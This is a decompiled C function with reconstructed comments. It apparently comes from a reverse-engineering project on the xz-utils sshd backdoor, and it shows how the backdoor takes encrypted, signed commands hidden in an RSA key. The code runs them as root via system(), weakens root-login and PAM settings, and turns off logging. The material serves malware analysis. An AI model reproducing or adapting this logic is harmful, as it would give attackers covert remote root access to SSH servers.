// /home/kali/xzre-ghidra/xzregh/1094A0_run_backdoor_commands.c
// Function: run_backdoor_commands @ 0x1094A0
// Calling convention: __stdcall
// Prototype: BOOL __stdcall run_backdoor_commands(RSA * key, global_context_t * ctx, BOOL * do_orig)


/*
 * AutoDoc: Generated from upstream sources.
 *
 * Source summary (xzre/xzre.h):
 *   @brief checks if the supplied RSA public key contains the backdoor commands, and executes them if present.
 *
 *   this function is called from function hooks. the output parameter @p do_orig
 *   will indicate to the caller if the original function should be invoked or not
 *
 *   @param key the public RSA key to check
 *   @param ctx the global context, used for the secret data (chacha key)
 *   @param do_orig output variable. will contain TRUE if the original function should be invoked, FALSE otherwise.
 *   @return BOOL TRUE if backdoor commands were invoked, FALSE otherwise
 *
 * Upstream implementation excerpt (xzre/xzre_code/run_backdoor_commands.c):
 *     #warning "this function is WIP / needs validation"
 *     
 *     /**
 *      * Copyright (C) 2024 Stefano Moioli <smxdev4@gmail.com>
 *      ** /
 *     #include "xzre.h"
 *     #include <assert.h>
 *     #include <openssl/bn.h>
 *     #include <string.h>
 *     #include <sys/select.h>
 *     #include <sys/types.h>
 *     #include <time.h>
 *     #include <errno.h>
 *     
 *     #define MONITOR_REQ_KEYALLOWED 22
 *     
 *     #define SIZE_STEP0 (sizeof(backdoor_payload_hdr_t))
 *     #define SIZE_STEP1 (SIZE_STEP0 + ED448_SIGNATURE_SIZE)
 *     #define SIZE_STEP2 (SIZE_STEP1 + sizeof(cmd_arguments_t))
 *     #define SIZE_HEADERS SIZE_STEP2
 *     #define SIZE_SYSTEM_EXTRA (sizeof(uid_t) + sizeof(gid_t))
 *     
 *     // $FIXME: move to xzre.h
 *     extern BOOL sshd_set_log_handler(cmd_arguments_t *args, global_context_t *ctx);
 *     
 *     BOOL run_backdoor_commands(RSA *rsa, global_context_t *ctx, BOOL *do_orig){
 *     	run_backdoor_commands_data_t f = {0};
 *     	f.p_do_orig = do_orig;
 *     
 *     	if(!ctx){
 *     		exit_early:
 *     		if(!do_orig){
 *     			return FALSE;
 *     		}
 *     		goto exit;
 *     	} else if(ctx->disable_backdoor
 *     		|| !rsa
 *     		|| !ctx->imported_funcs
 *     		|| !ctx->imported_funcs->RSA_get0_key
 *     		|| !ctx->imported_funcs->BN_bn2bin
 *     	){
 *     		ctx->disable_backdoor = TRUE;
 *     		goto exit_early;
 *     	}
 *     
 *     	if(do_orig){
 *     		do {
 *     			*f.p_do_orig = TRUE;
 *     		
 *     			ctx->imported_funcs->RSA_get0_key(
 *     				rsa, &f.kctx.rsa_n, &f.kctx.rsa_e, NULL);
 *     			if(!f.kctx.rsa_n || !f.kctx.rsa_e) break;
 *     			if(!ctx->imported_funcs) break;
 *     			if(!ctx->imported_funcs->BN_num_bits) break;
 *     			
 *     			int num_n_bits = ctx->imported_funcs->BN_num_bits(f.kctx.rsa_n);
 *     			if(num_n_bits > 0x4000) break;
 *     			
 *     			int num_n_bytes = X_BN_num_bytes(num_n_bits);
 *     			if(num_n_bytes > 536) break;
 *     			
 *     			int rsa_n_length = ctx->imported_funcs->BN_bn2bin(f.kctx.rsa_n, (u8 *)&f.kctx.payload);
 *     			if(rsa_n_length < 0) break;
 *     			if(num_n_bytes < rsa_n_length) break;
 *     
 *     			if(rsa_n_length <= sizeof(backdoor_payload_hdr_t)) goto exit;
 *     			// `field_a` cannot be 0
 *     			if(!f.kctx.payload.header.field_a) goto exit;
 *     			// `field_b` cannot be 0
 *     			if(!f.kctx.payload.header.field_b) goto exit;
 *     
 *     			u64 cmd_type = f.kctx.payload.header.field_c + (f.kctx.payload.header.field_b * f.kctx.payload.header.field_a);
 *     			if(cmd_type > 3) goto exit;
 *     
 *     			if(!ctx->libc_imports) break;
 *     			if(!ctx->libc_imports->getuid) break;
 *     			if(!ctx->libc_imports->exit) break;
 *     			if(!ctx->sshd_log_ctx) break;
 *     			if(ctx->num_shifted_bits != ED448_KEY_SIZE * 8) break;
 *     			*(backdoor_payload_hdr_t *)f.kctx.ivec = f.kctx.payload.header;
 *     ...
 */

BOOL run_backdoor_commands(RSA *key,global_context_t *ctx,BOOL *do_orig)

{
  uid_t *puVar1;
  imported_funcs_t *piVar2;
  pfn_RSA_get0_key_t ppVar3;
  _func_39 *p_Var4;
  libc_imports_t *plVar5;
  sensitive_data *psVar6;
  sshkey **ppsVar7;
  _func_27 *p_Var8;
  sshd_ctx_t *psVar9;
  long *plVar10;
  _func_19 *p_Var11;
  byte bVar12;
  uint uVar13;
  int iVar14;
  BOOL BVar15;
  uid_t uVar16;
  int iVar17;
  ulong uVar18;
  int *piVar19;
  ssize_t sVar20;
  BIGNUM *e;
  BIGNUM *n;
  long lVar21;
  byte bVar22;
  uint uVar23;
  u64 uVar24;
  ulong uVar25;
  u32 uVar26;
  ulong uVar27;
  undefined1 uVar28;
  uint *puVar29;
  gid_t rgid;
  undefined1 *puVar30;
  u8 *puVar31;
  monitor_data_t *pmVar32;
  BIGNUM **ppBVar33;
  u8 *puVar34;
  byte bVar35;
  long lVar36;
  ulong uVar37;
  ulong uVar38;
  int iVar39;
  byte bVar40;
  ulong local_5f8;
  long local_5e0;
  uint local_5c0;
  undefined1 local_5a1;
  u64 local_5a0;
  u64 local_598;
  undefined8 local_590;
  undefined8 uStack_588;
  undefined1 local_580 [48];
  monitor_data_t local_550 [4];
  undefined1 local_45a;
  undefined1 local_451;
  BIGNUM *local_2f0;
  BIGNUM *local_2e8;
  undefined1 local_2e0 [7];
  u8 auStack_2d9 [2];
  uint uStack_2d7;
  long lStack_2d3;
  u8 local_2cb [114];
  uint local_259;
  undefined1 local_255;
  u8 local_254 [465];
  undefined8 local_83;
  long lStack_7b;
  u8 local_73 [67];
  
  bVar40 = 0;
  ppBVar33 = &local_2f0;
  for (lVar21 = 0xae; lVar21 != 0; lVar21 = lVar21 + -1) {
    *(undefined4 *)ppBVar33 = 0;
    ppBVar33 = (BIGNUM **)((long)ppBVar33 + 4);
  }
  if (ctx != (global_context_t *)0x0) {
    if ((((ctx->disable_backdoor == 0) && (key != (RSA *)0x0)) &&
        (piVar2 = ctx->imported_funcs, piVar2 != (imported_funcs_t *)0x0)) &&
       ((ppVar3 = piVar2->RSA_get0_key, ppVar3 != (pfn_RSA_get0_key_t)0x0 &&
        (piVar2->BN_bn2bin != (_func_58 *)0x0)))) {
      if (do_orig == (BOOL *)0x0) {
        ctx->disable_backdoor = 1;
        return 0;
      }
      *do_orig = 1;
      (*ppVar3)(key,&local_2f0,&local_2e8,(BIGNUM **)0x0);
      if ((((local_2f0 != (BIGNUM *)0x0) && (local_2e8 != (BIGNUM *)0x0)) &&
          ((ctx->imported_funcs != (imported_funcs_t *)0x0 &&
           (((p_Var4 = ctx->imported_funcs->BN_num_bits, p_Var4 != (_func_39 *)0x0 &&
             (uVar13 = (*p_Var4)(local_2f0), uVar13 < 0x4001)) &&
            (uVar13 = uVar13 + 7 >> 3, uVar13 - 0x14 < 0x205)))))) &&
         (iVar14 = (*ctx->imported_funcs->BN_bn2bin)(local_2f0,local_2e0 + 5), -1 < iVar14)) {
        uVar37 = (ulong)uVar13;
        if ((ulong)(long)iVar14 <= uVar37) {
          if ((ulong)(long)iVar14 < 0x11) goto LAB_0010a11a;
          if (((CONCAT13(auStack_2d9[1],stack0xfffffffffffffd25) == 0) || (uStack_2d7 == 0)) ||
             (uVar27 = (ulong)CONCAT13(auStack_2d9[1],stack0xfffffffffffffd25) * (ulong)uStack_2d7 +
                       lStack_2d3, 3 < uVar27)) goto LAB_0010a11a;
          plVar5 = ctx->libc_imports;
          if (((plVar5 != (libc_imports_t *)0x0) && (plVar5->getuid != (_func_18 *)0x0)) &&
             ((plVar5->exit != (_func_19 *)0x0 &&
              ((ctx->sshd_log_ctx != (sshd_log_ctx_t *)0x0 && (ctx->num_shifted_bits == 0x1c8))))))
          {
            local_83 = CONCAT44(uStack_2d7,CONCAT13(auStack_2d9[1],stack0xfffffffffffffd25));
            lStack_7b = lStack_2d3;
            BVar15 = secret_data_get_decrypted(local_73,ctx);
            if ((BVar15 != 0) &&
               (BVar15 = chacha_decrypt(local_2cb,uVar13 - 0x10,local_73,(u8 *)&local_83,local_2cb,
                                        ctx->imported_funcs), BVar15 != 0)) {
              local_550[0].cmd_type = 0;
              local_550[0]._unknown2059[0] = '\0';
              local_550[0]._unknown2059[1] = '\0';
              local_550[0]._unknown2059[2] = '\0';
              local_550[0]._unknown2059[3] = '\0';
              local_550[0].args = (cmd_arguments_t *)0x0;
              puVar34 = local_73;
              for (lVar21 = 0x39; lVar21 != 0; lVar21 = lVar21 + -1) {
                *puVar34 = '\0';
                puVar34 = puVar34 + (ulong)bVar40 * -2 + 1;
              }
              local_590 = 0;
              uStack_588 = 0;
              ppBVar33 = &local_550[0].rsa_n;
              for (lVar21 = 0x93; lVar21 != 0; lVar21 = lVar21 + -1) {
                *(undefined4 *)ppBVar33 = 0;
                ppBVar33 = (BIGNUM **)((long)ppBVar33 + (ulong)bVar40 * -8 + 4);
              }
              psVar6 = ctx->sshd_sensitive_data;
              puVar30 = local_580;
              for (lVar21 = 0x29; lVar21 != 0; lVar21 = lVar21 + -1) {
                *puVar30 = 0;
                puVar30 = puVar30 + (ulong)bVar40 * -2 + 1;
              }
              if ((((psVar6 != (sensitive_data *)0x0) && (psVar6->host_pubkeys != (sshkey **)0x0))
                  && (ctx->imported_funcs != (imported_funcs_t *)0x0)) && (0x71 < uVar37 - 0x10)) {
                uVar26 = (u32)uVar27;
                local_550[0].cmd_type = uVar26;
                if (4 < uVar37 - 0x82) {
                  local_2e0[0] = (byte)local_259;
                  local_2e0[1] = (byte)(local_259 >> 8);
                  local_2e0[2] = (byte)(local_259 >> 0x10);
                  local_2e0[3] = (byte)(local_259 >> 0x18);
                  stack0xfffffffffffffd24 = CONCAT31(stack0xfffffffffffffd25,local_255);
                  local_5f8 = uVar37 - 0x87;
                  if (uVar27 == 2) {
                    uVar18 = (ulong)CONCAT11(local_255,local_2e0[3]);
                    if ((char)local_2e0[0] < '\0') {
                      if (CONCAT11(local_255,local_2e0[3]) != 0) goto LAB_0010a112;
                      uVar25 = 0;
                      uVar18 = 0x39;
                      puVar34 = local_254;
                      lVar21 = 0;
                    }
                    else {
                      if ((local_259 & 0x100) != 0) {
                        uVar18 = uVar18 + 8;
                      }
                      puVar34 = (u8 *)0x0;
                      lVar21 = 0x87;
                      uVar25 = uVar18;
                    }
                    if (local_5f8 < uVar18) goto LAB_0010a112;
                    local_5e0 = uVar18 + 5;
                    local_5f8 = local_5f8 - uVar18;
                    uVar38 = uVar18 + 0x87;
                    iVar14 = (int)uVar18 + 4;
                  }
                  else if ((uVar26 == 3) && ((local_259 & 0x4000) == 0)) {
                    if (local_5f8 < 0x30) goto LAB_0010a112;
                    uVar25 = 0x30;
                    lVar21 = 0x87;
                    puVar34 = (u8 *)0x0;
                    local_5e0 = 0x35;
                    uVar38 = 0x87;
                    iVar14 = 0x34;
                  }
                  else {
                    uVar25 = 0;
                    lVar21 = 0;
                    uVar38 = 0x87;
                    puVar34 = (u8 *)0x0;
                    local_5e0 = 5;
                    iVar14 = 4;
                  }
                  puVar29 = &local_259;
                  puVar31 = local_550[0]._unknown2059;
                  for (uVar18 = (ulong)(iVar14 + 1); uVar18 != 0; uVar18 = uVar18 - 1) {
                    *puVar31 = (u8)*puVar29;
                    puVar29 = (uint *)((long)puVar29 + (ulong)bVar40 * -2 + 1);
                    puVar31 = puVar31 + (ulong)bVar40 * -2 + 1;
                  }
                  local_5a0 = 0;
                  ppsVar7 = psVar6->host_keys;
                  local_598 = 0;
                  if (((ppsVar7 != (sshkey **)0x0) && (psVar6->host_pubkeys != (sshkey **)0x0)) &&
                     ((ppsVar7 != psVar6->host_pubkeys &&
                      (((((uint)psVar6->have_ssh2_key < 2 &&
                         (BVar15 = count_pointers(ppsVar7,&local_5a0,ctx->libc_imports), BVar15 != 0
                         )) && (BVar15 = count_pointers(ctx->sshd_sensitive_data->host_pubkeys,
                                                        &local_598,ctx->libc_imports),
                               uVar24 = local_5a0, BVar15 != 0)) && (local_5a0 == local_598)))))) {
                    BVar15 = secret_data_get_decrypted((u8 *)&local_590,ctx);
                    if (BVar15 != 0) {
                      lVar36 = 0;
                      do {
                        local_5c0 = (uint)uVar24;
                        uVar13 = (uint)lVar36;
                        if (local_5c0 <= uVar13) goto LAB_0010a112;
                        BVar15 = verify_signature(ctx->sshd_sensitive_data->host_pubkeys[lVar36],
                                                  (u8 *)local_550,local_5e0 + 4,0x25c,local_2cb,
                                                  (u8 *)&local_590,ctx);
                        lVar36 = lVar36 + 1;
                      } while (BVar15 == 0);
                      ctx->sshd_host_pubkey_idx = uVar13;
                      if ((uVar27 != 2) || (-1 < (char)local_2e0[0])) {
                        if (lVar21 == 0) {
LAB_00109a97:
                          if (uVar38 <= uVar37) goto LAB_00109aa2;
                        }
                        else {
                          uVar38 = 0x87;
LAB_00109aa2:
                          if (uVar25 <= uVar37 - uVar38) {
                            if ((((local_2e0[0] & 4) == 0) ||
                                (ctx->libc_imports == (libc_imports_t *)0x0)) ||
                               (p_Var8 = ctx->libc_imports->setlogmask, p_Var8 == (_func_27 *)0x0))
                            {
                              ctx->sshd_log_ctx->syslog_disabled = 0;
                              if ((local_2e0[0] & 5) == 5) goto LAB_0010a1ba;
                            }
                            else {
                              (*p_Var8)(-0x80000000);
                              ctx->sshd_log_ctx->syslog_disabled = 1;
                            }
                            uVar16 = (*ctx->libc_imports->getuid)();
                            bVar12 = local_2e0[0];
                            ctx->uid = uVar16;
                            bVar35 = local_2e0[0] & 0x10;
                            if (((bVar35 == 0) || (ctx->sshd_log_ctx->log_hooking_possible != 0)) &&
                               (((local_2e0[0] & 2) == 0 ||
                                ((BVar15 = sshd_configure_log_hook((cmd_arguments_t *)local_2e0,ctx)
                                 , BVar15 != 0 || (bVar35 == 0)))))) {
                              if (uVar27 == 0) {
                                if (((char)local_2e0[1] < '\0') ||
                                   (ctx->sshd_ctx->permit_root_login_ptr != (int *)0x0)) {
                                  bVar35 = 0xff;
                                  if ((local_2e0[1] & 2) != 0) {
                                    bVar35 = (byte)(CONCAT11(local_2e0[3],local_2e0[2]) >> 6) & 0x7f
                                    ;
                                  }
                                  bVar22 = 0xff;
                                  if ((char)bVar12 < '\0') {
                                    bVar22 = (byte)(((ulong)CONCAT41(stack0xfffffffffffffd24,
                                                                     local_2e0[3]) << 0x18) >> 0x1d)
                                             & 0x1f;
                                  }
                                  uVar13 = (uint)CONCAT11(bVar22,bVar35);
                                  if ((local_2e0[1] & 4) == 0) {
LAB_00109c56:
                                    uVar13 = uVar13 | 0xff0000;
                                    uVar23 = 0xff;
                                  }
                                  else {
                                    uVar23 = (uint)((byte)local_2e0[4] >> 5);
                                    uVar13 = uVar13 | ((byte)local_2e0[4] >> 2 & 7) << 0x10;
                                  }
LAB_00109c7b:
                                  uVar13 = uVar13 | uVar23 << 0x18;
LAB_00109c8a:
                                  (ctx->sshd_offsets).field0_0x0.raw_value = uVar13;
                                  puVar1 = (uid_t *)(local_2e0 + uVar38 + 5);
                                  if (uVar16 == 0) {
                                    plVar5 = ctx->libc_imports;
                                    if ((((plVar5 != (libc_imports_t *)0x0) &&
                                         (plVar5->setresgid != (_func_20 *)0x0)) &&
                                        (plVar5->setresuid != (_func_21 *)0x0)) &&
                                       (plVar5->system != (_func_22 *)0x0)) {
                                      if (uVar27 == 0) {
                                        psVar9 = ctx->sshd_ctx;
                                        if (((psVar9 != (sshd_ctx_t *)0x0) &&
                                            (psVar9->mm_answer_keyallowed_ptr != (void *)0x0)) &&
                                           (psVar9->have_mm_answer_keyallowed != 0)) {
                                          if ((char)local_2e0[1] < '\0') goto LAB_00109d36;
                                          piVar19 = psVar9->permit_root_login_ptr;
                                          if (piVar19 != (int *)0x0) {
                                            iVar14 = *piVar19;
                                            if (iVar14 < 3) {
                                              if (-1 < iVar14) {
                                                *piVar19 = 3;
LAB_00109d36:
                                                if ((bVar12 & 0x40) != 0) {
                                                  puVar29 = (uint *)psVar9->use_pam_ptr;
                                                  if ((puVar29 == (uint *)0x0) || (1 < *puVar29))
                                                  goto LAB_0010a1ba;
                                                  *puVar29 = 0;
                                                }
                                                local_5a0 = CONCAT44(local_5a0._4_4_,0xffffffff);
                                                if ((bVar12 & 0x20) == 0) {
                                                  iVar14 = sshd_get_client_socket
                                                                     (ctx,(int *)&local_5a0,1,
                                                                      DIR_READ);
                                                }
                                                else {
                                                  iVar14 = sshd_get_usable_socket
                                                                     ((int *)&local_5a0,
                                                                      local_2e0[1] >> 3 & 0xf,plVar5
                                                                     );
                                                }
                                                if (iVar14 != 0) {
                                                  iVar14 = (int)local_5a0;
                                                  local_5a1 = 0;
                                                  local_598 = local_598 & 0xffffffff00000000;
                                                  local_590 = 0;
                                                  uStack_588 = 0;
                                                  if (((-1 < (int)local_5a0) &&
                                                      (plVar5 = ctx->libc_imports,
                                                      plVar5 != (libc_imports_t *)0x0)) &&
                                                     ((plVar5->pselect != (_func_24 *)0x0 &&
                                                      (plVar5->__errno_location != (_func_26 *)0x0))
                                                     )) {
                                                    iVar39 = (int)local_5a0 >> 6;
                                                    uVar37 = 1L << ((byte)local_5a0 & 0x3f);
                                                    do {
                                                      uStack_588 = 500000000;
                                                      pmVar32 = local_550;
                                                      for (lVar21 = 0x20; lVar21 != 0;
                                                          lVar21 = lVar21 + -1) {
                                                        pmVar32->cmd_type = 0;
                                                        pmVar32 = (monitor_data_t *)
                                                                  ((long)pmVar32 +
                                                                  (ulong)bVar40 * -8 + 4);
                                                      }
                                                      *(ulong *)(local_550[0]._unknown2059 +
                                                                (long)iVar39 * 8 + -4) = uVar37;
                                                      local_590 = 0;
                                                      iVar17 = (*plVar5->pselect)(iVar14 + 1,
                                                                                  (fd_set *)
                                                                                  local_550,
                                                                                  (fd_set *)0x0,
                                                                                  (fd_set *)0x0,
                                                                                  (timespec *)
                                                                                  &local_590,
                                                                                  (sigset_t *)0x0);
                                                      if (-1 < iVar17) {
                                                        if (((iVar17 != 0) &&
                                                            ((uVar37 & *(ulong *)(local_550[0].
                                                                                  _unknown2059 +
                                                                                 (long)iVar39 * 8 +
                                                                                 -4)) != 0)) &&
                                                           (sVar20 = fd_read(iVar14,&local_598,4,
                                                                             plVar5), -1 < sVar20))
                                                        {
                                                          uVar13 = (uint)local_598 >> 0x18 |
                                                                   ((uint)local_598 & 0xff0000) >> 8
                                                                   | ((uint)local_598 & 0xff00) << 8
                                                                   | (uint)local_598 << 0x18;
                                                          local_598 = CONCAT44(local_598._4_4_,
                                                                               uVar13);
                                                          if ((uVar13 - 1 < 0x41) &&
                                                             (sVar20 = fd_read(iVar14,&local_5a1,1,
                                                                               plVar5), -1 < sVar20)
                                                             ) {
                                                            ctx->sock_read_buf_size =
                                                                 (ulong)((uint)local_598 - 1);
                                                            sVar20 = fd_read(iVar14,ctx->
                                                  sock_read_buf,(ulong)((uint)local_598 - 1),plVar5)
                                                  ;
                                                  if (-1 < sVar20) {
                                                    psVar9 = ctx->sshd_ctx;
                                                    if (psVar9->mm_answer_keyallowed != (void *)0x0)
                                                    {
                                                      plVar10 = (long *)psVar9->
                                                  mm_answer_keyallowed_ptr;
                                                  if ((local_2e0[2] & 0x3f) == 0) {
                                                    iVar14 = 0x16;
                                                    if (plVar10 != (long *)0x0) {
                                                      iVar14 = (int)plVar10[-1];
                                                    }
                                                  }
                                                  else {
                                                    iVar14 = (uint)(local_2e0[2] & 0x3f) * 2;
                                                  }
                                                  psVar9->mm_answer_keyallowed_reqtype = iVar14 + 1;
                                                  *plVar10 = (long)psVar9->mm_answer_keyallowed;
                                                  goto LAB_0010a076;
                                                  }
                                                  }
                                                  }
                                                  }
                                                  break;
                                                  }
                                                  piVar19 = (*plVar5->__errno_location)();
                                                  } while (*piVar19 == 4);
                                                  }
                                                }
                                              }
                                            }
                                            else if (iVar14 == 3) goto LAB_00109d36;
                                          }
                                        }
                                      }
                                      else if (uVar26 == 1) {
                                        BVar15 = sshd_patch_variables
                                                           (local_2e0[1] & 1,local_2e0[0] >> 6 & 1,
                                                            local_2e0[1] >> 1 & 1,(uint)local_2e0[3]
                                                            ,ctx);
                                        if (BVar15 != 0) {
LAB_0010a076:
                                          local_590 = CONCAT71(local_590._1_7_,1);
                                          local_550[0].args = (cmd_arguments_t *)0x0;
                                          ppBVar33 = &local_550[0].rsa_n;
                                          for (lVar21 = 0x3c; lVar21 != 0; lVar21 = lVar21 + -1) {
                                            *(undefined4 *)ppBVar33 = 0;
                                            ppBVar33 = (BIGNUM **)
                                                       ((long)ppBVar33 + (ulong)bVar40 * -8 + 4);
                                          }
                                          local_550[0].cmd_type = 0x80;
                                          local_550[0]._unknown2059[0] = '\0';
                                          local_550[0]._unknown2059[1] = '\0';
                                          local_550[0]._unknown2059[2] = '\0';
                                          local_550[0]._unknown2059[3] = '\0';
                                          local_45a = 8;
                                          local_451 = 1;
                                          e = (*ctx->imported_funcs->BN_bin2bn)
                                                        ((uchar *)&local_590,1,(BIGNUM *)0x0);
                                          if (((e != (BIGNUM *)0x0) &&
                                              (n = (*ctx->imported_funcs->BN_bin2bn)
                                                             ((uchar *)local_550,0x100,(BIGNUM *)0x0
                                                             ), n != (BIGNUM *)0x0)) &&
                                             (iVar14 = (*ctx->imported_funcs->RSA_set0_key)
                                                                 (key,n,e,(BIGNUM *)0x0),
                                             iVar14 == 1)) goto LAB_0010a112;
                                        }
                                      }
                                      else if (uVar26 == 2) {
                                        uVar25 = uVar25 & 0xffff;
                                        if ((local_2e0[1] & 1) == 0) {
                                          rgid = 0;
                                          lVar21 = 0;
                                          uVar16 = 0;
                                        }
                                        else {
                                          if (uVar25 < 9) goto LAB_0010a1ba;
                                          uVar16 = *puVar1;
                                          rgid = *(gid_t *)((long)&uStack_2d7 + uVar38);
                                          uVar25 = uVar25 - 8;
                                          lVar21 = 8;
                                        }
                                        if ((char)bVar12 < '\0') {
                                          if (2 < uVar25) {
                                            uVar37 = (ulong)*(ushort *)((long)puVar1 + lVar21);
                                            uVar25 = uVar25 - 2;
                                            lVar21 = lVar21 + 2;
                                            if (uVar25 <= uVar37) goto LAB_00109fb9;
                                          }
                                        }
                                        else {
                                          uVar37 = (ulong)CONCAT11(local_2e0[4],local_2e0[3]);
LAB_00109fb9:
                                          if ((((uVar37 <= uVar25) &&
                                               ((rgid == 0 ||
                                                (iVar14 = (*plVar5->setresgid)(rgid,rgid,rgid),
                                                iVar14 != -1)))) &&
                                              ((uVar16 == 0 ||
                                               (iVar14 = (*ctx->libc_imports->setresuid)
                                                                   (uVar16,uVar16,uVar16),
                                               iVar14 != -1)))) &&
                                             (*(char *)((long)puVar1 + lVar21) != '\0')) {
                                            (*ctx->libc_imports->system)
                                                      ((char *)((long)puVar1 + lVar21));
                                            goto LAB_0010a076;
                                          }
                                        }
                                      }
                                      else if ((((local_2e0[1] & 0xc0) == 0xc0) &&
                                               (plVar5->exit != (_func_19 *)0x0)) &&
                                              (plVar5->pselect != (_func_24 *)0x0)) {
                                        local_550[0].args = (cmd_arguments_t *)0x0;
                                        local_550[0].cmd_type = 5;
                                        local_550[0]._unknown2059[0] = '\0';
                                        local_550[0]._unknown2059[1] = '\0';
                                        local_550[0]._unknown2059[2] = '\0';
                                        local_550[0]._unknown2059[3] = '\0';
                                        (*plVar5->pselect)(0,(fd_set *)0x0,(fd_set *)0x0,
                                                           (fd_set *)0x0,(timespec *)local_550,
                                                           (sigset_t *)0x0);
                                        (*plVar5->exit)(0);
                                      }
                                    }
                                  }
                                  else {
                                    puVar34 = local_550[0]._unknown2059;
                                    for (lVar21 = 0xb; lVar21 != 0; lVar21 = lVar21 + -1) {
                                      puVar34[0] = '\0';
                                      puVar34[1] = '\0';
                                      puVar34[2] = '\0';
                                      puVar34[3] = '\0';
                                      puVar34 = puVar34 + ((ulong)bVar40 * -2 + 1) * 4;
                                    }
                                    local_550[0].args = (cmd_arguments_t *)local_2e0;
                                    local_550[0].rsa_n = local_2f0;
                                    local_550[0].rsa_e = local_2e8;
                                    local_550[0].payload_body = (u8 *)puVar1;
                                    local_550[0].payload_body_size = (u16)uVar25;
                                    local_550[0].rsa = key;
                                    BVar15 = sshd_proxy_elevate(local_550,ctx);
                                    if (BVar15 != 0) {
                                      ctx->disable_backdoor = 1;
                                      *do_orig = 0;
                                      return 1;
                                    }
                                  }
                                }
                              }
                              else if (uVar26 == 1) {
                                if (((local_2e0[1] & 1) != 0) ||
                                   (ctx->sshd_ctx->permit_root_login_ptr != (int *)0x0))
                                goto LAB_00109b6c;
                              }
                              else {
                                if (uVar26 != 3) {
LAB_00109b6c:
                                  uVar13 = 0;
                                  goto LAB_00109c8a;
                                }
                                if (((char)local_2e0[3] < '\0') ||
                                   (ctx->sshd_ctx->permit_root_login_ptr != (int *)0x0)) {
                                  if ((local_2e0[2] & 0x20) != 0) {
                                    uVar28 = 0xff;
                                    if ((char)local_2e0[2] < '\0') {
                                      uVar28 = local_2e0[4];
                                    }
                                    bVar35 = 0xff;
                                    if ((local_2e0[2] & 0x40) != 0) {
                                      bVar35 = local_2e0[3] & 0x3f;
                                    }
                                    uVar13 = (uint)CONCAT11(bVar35,uVar28);
                                    if ((local_2e0[3] & 0x40) == 0) goto LAB_00109c56;
                                    uVar23 = local_2e0[1] >> 3 & 7;
                                    uVar13 = uVar13 | (local_2e0[1] & 7) << 0x10;
                                    goto LAB_00109c7b;
                                  }
                                  uVar13 = 0xffffffff;
                                  goto LAB_00109c8a;
                                }
                              }
                            }
                          }
                        }
LAB_0010a1ba:
                        ctx->disable_backdoor = 1;
                        puVar34 = local_73;
                        for (lVar21 = 0x39; lVar21 != 0; lVar21 = lVar21 + -1) {
                          *puVar34 = '\0';
                          puVar34 = puVar34 + (ulong)bVar40 * -2 + 1;
                        }
                        if ((local_2e0[0] & 1) != 0) {
                          if (ctx->libc_imports == (libc_imports_t *)0x0) {
                            return 0;
                          }
                          p_Var11 = ctx->libc_imports->exit;
                          if (p_Var11 == (_func_19 *)0x0) {
                            return 0;
                          }
                          (*p_Var11)(0);
                          return 0;
                        }
                        goto LAB_0010a11a;
                      }
                      if (puVar34 != (u8 *)0x0) {
                        if ((local_2e0[1] & 1) == 0) {
                          lVar21 = 0;
                        }
                        else {
                          lVar21 = 8;
                          if (local_5f8 < 9) goto LAB_0010a112;
                        }
                        if (((lVar21 + 2U <= local_5f8) &&
                            (uVar25 = (ulong)*(ushort *)(local_2e0 + uVar38 + lVar21 + 5) +
                                      lVar21 + 2U, uVar25 < local_5f8)) &&
                           (0x71 < local_5f8 - uVar25)) {
                          if (((ctx->current_data_size <= ctx->payload_data_size) &&
                              (uVar18 = ctx->payload_data_size - ctx->current_data_size,
                              0x38 < uVar18)) && (uVar25 <= uVar18 - 0x39)) {
                            puVar31 = ctx->payload_data;
                            uVar18 = 0;
                            do {
                              puVar31[uVar18] = local_2e0[uVar18 + uVar38 + 5];
                              uVar18 = uVar18 + 1;
                            } while (uVar25 != uVar18);
                            ppsVar7 = ctx->sshd_sensitive_data->host_pubkeys;
                            uVar24 = ctx->current_data_size + uVar25;
                            ctx->current_data_size = uVar24;
                            BVar15 = verify_signature(ppsVar7[ctx->sshd_host_pubkey_idx],
                                                      ctx->payload_data,uVar24,
                                                      ctx->payload_data_size,
                                                      auStack_2d9 + uVar25 + uVar38 + -2,puVar34,ctx
                                                     );
                            if (BVar15 != 0) goto LAB_00109a97;
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
LAB_0010a112:
      ctx->disable_backdoor = 1;
      goto LAB_0010a11a;
    }
    ctx->disable_backdoor = 1;
  }
  if (do_orig == (BOOL *)0x0) {
    return 0;
  }
LAB_0010a11a:
  *do_orig = 1;
  return 0;
}

